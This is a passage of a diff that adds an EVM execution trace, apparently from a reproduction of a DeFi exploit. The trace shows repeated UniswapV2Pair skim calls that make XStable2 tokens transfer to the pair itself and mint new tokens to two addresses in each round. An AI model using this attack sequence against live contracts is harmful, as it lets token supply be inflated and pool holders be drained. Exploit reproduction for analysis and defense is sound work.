+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 422919821123143 [4.229e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 422919821123143 [4.229e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 798761537551945 [7.987e14]
+    │   │   │   │   │   │   └─ ← [Return] 798761537551945 [7.987e14]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 422919821123143 [4.229e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 43908593128557 [4.39e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 43908593128557 [4.39e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x1195f35f5519f11c09b94c8768763c50f16825dac81ea301a79d64b717ee126c → 0x1282bf49e41ec4f41576ee67e451c84bfc57629c17a3a548224e0d143440dc48
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000002645255112c4e → 0x0000000000000000000000000000000000000000000000000002d67829b4be49
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000029ef8510bc163c → 0x00000000000000000000000000000000000000000000000000302ce7b4934758
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x1195f35f5519f11c09b94c8768763c50f16825dac81ea301a79d64b717ee126c → 0x1282bf49e41ec4f41576ee67e451c84bfc57629c17a3a548224e0d143440dc48
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 917612787761093 [9.176e14]
+    │   │   │   │   └─ ← [Return] 917612787761093 [9.176e14]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 541771071332291 [5.417e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 541771071332291 [5.417e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 917612787761093 [9.176e14]
+    │   │   │   │   │   │   └─ ← [Return] 917612787761093 [9.176e14]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 541771071332291 [5.417e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 39019706985029 [3.901e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 39019706985029 [3.901e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000002d67829b4be49 → 0x0000000000000000000000000000000000000000000000000003429060417fc5
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x1282bf49e41ec4f41576ee67e451c84bfc57629c17a3a548224e0d143440dc48 → 0x1339ec3b98f8ffc4bccb7723f818def9efe3425c797764aeb11a48f18d9c8755
+    │   │   │   │   │   │   @ 12: 0x00000000000000000000000000000000000000000000000000302ce7b4934758 → 0x0000000000000000000000000000000000000000000000000035b86f0b89e245
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x1282bf49e41ec4f41576ee67e451c84bfc57629c17a3a548224e0d143440dc48 → 0x1339ec3b98f8ffc4bccb7723f818def9efe3425c797764aeb11a48f18d9c8755
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1023230859931782 [1.023e15]
+    │   │   │   │   └─ ← [Return] 1023230859931782 [1.023e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 647389143502980 [6.473e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 647389143502980 [6.473e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1023230859931782 [1.023e15]
+    │   │   │   │   │   │   └─ ← [Return] 1023230859931782 [1.023e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 647389143502980 [6.473e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 34520407604437 [3.452e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 34520407604437 [3.452e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000035b86f0b89e245 → 0x000000000000000000000000000000000000000000000000003aa04764d963a7
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000003429060417fc5 → 0x0000000000000000000000000000000000000000000000000003a29f7fedf086
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x1339ec3b98f8ffc4bccb7723f818def9efe3425c797764aeb11a48f18d9c8755 → 0x13cb3fdb30397ca611ccfc7f4e958afabb6a3b4a97e263dabe4f575d904d6d00
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x1339ec3b98f8ffc4bccb7723f818def9efe3425c797764aeb11a48f18d9c8755 → 0x13cb3fdb30397ca611ccfc7f4e958afabb6a3b4a97e263dabe4f575d904d6d00
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1116670282814324 [1.116e15]
+    │   │   │   │   └─ ← [Return] 1116670282814324 [1.116e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 740828566385522 [7.408e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 740828566385522 [7.408e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1116670282814324 [1.116e15]
+    │   │   │   │   │   │   └─ ← [Return] 1116670282814324 [1.116e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 740828566385522 [7.408e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 30085048080916 [3.008e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 30085048080916 [3.008e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000003a29f7fedf086 → 0x0000000000000000000000000000000000000000000000000003f79b0f89d374
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x13cb3fdb30397ca611ccfc7f4e958afabb6a3b4a97e263dabe4f575d904d6d00 → 0x143f4e453445e474ddd9ac8320a0b0d25153e70bd881b4f40977e02432f6b22c
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x13cb3fdb30397ca611ccfc7f4e958afabb6a3b4a97e263dabe4f575d904d6d00 → 0x143f4e453445e474ddd9ac8320a0b0d25153e70bd881b4f40977e02432f6b22c
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000003aa04764d963a7 → 0x000000000000000000000000000000000000000000000000003ee6c43d0176c8
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1198104128042529 [1.198e15]
+    │   │   │   │   └─ ← [Return] 1198104128042529 [1.198e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 822262411613727 [8.222e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 822262411613727 [8.222e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1198104128042529 [1.198e15]
+    │   │   │   │   │   │   └─ ← [Return] 1198104128042529 [1.198e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 822262411613727 [8.222e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 26314452827668 [2.631e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 26314452827668 [2.631e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x143f4e453445e474ddd9ac8320a0b0d25153e70bd881b4f40977e02432f6b22c → 0x149deabfe9015e245bf4b9ef78cef6691eae2854d8081a2476065fece4ba3bc4
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000003f79b0f89d374 → 0x000000000000000000000000000000000000000000000000000441ab5af4b621
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000003ee6c43d0176c8 → 0x0000000000000000000000000000000000000000000000000042a414ad8929f3
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x143f4e453445e474ddd9ac8320a0b0d25153e70bd881b4f40977e02432f6b22c → 0x149deabfe9015e245bf4b9ef78cef6691eae2854d8081a2476065fece4ba3bc4
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1269331771524094 [1.269e15]
+    │   │   │   │   └─ ← [Return] 1269331771524094 [1.269e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 893490055095292 [8.934e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 893490055095292 [8.934e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1269331771524094 [1.269e15]
+    │   │   │   │   │   │   └─ ← [Return] 1269331771524094 [1.269e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 893490055095292 [8.934e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 23340193964226 [2.334e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 23340193964226 [2.334e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x149deabfe9015e245bf4b9ef78cef6691eae2854d8081a2476065fece4ba3bc4 → 0x14ed2026435361ac689816e3ffc2b2c910c5b7cfafd5421f58bb382a51f08ef2
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000441ab5af4b621 → 0x00000000000000000000000000000000000000000000000000048273555803fe
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x149deabfe9015e245bf4b9ef78cef6691eae2854d8081a2476065fece4ba3bc4 → 0x14ed2026435361ac689816e3ffc2b2c910c5b7cfafd5421f58bb382a51f08ef2
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000042a414ad8929f3 → 0x0000000000000000000000000000000000000000000000000045f5312c584861
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1332508726992708 [1.332e15]
+    │   │   │   │   └─ ← [Return] 1332508726992708 [1.332e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 956667010563906 [9.566e14])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 956667010563906 [9.566e14]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1332508726992708 [1.332e15]
+    │   │   │   │   │   │   └─ ← [Return] 1332508726992708 [1.332e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 956667010563906 [9.566e14])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 20319607304377 [2.031e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 20319607304377 [2.031e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x14ed2026435361ac689816e3ffc2b2c910c5b7cfafd5421f58bb382a51f08ef2 → 0x152ed05cd224e8ba91768a5b15830b8642177e64419cd434463e5b012c48273c
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x00000000000000000000000000000000000000000000000000048273555803fe → 0x0000000000000000000000000000000000000000000000000004bbe8dd551f44
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000045f5312c584861 → 0x0000000000000000000000000000000000000000000000000048d86a435be557
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x14ed2026435361ac689816e3ffc2b2c910c5b7cfafd5421f58bb382a51f08ef2 → 0x152ed05cd224e8ba91768a5b15830b8642177e64419cd434463e5b012c48273c
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
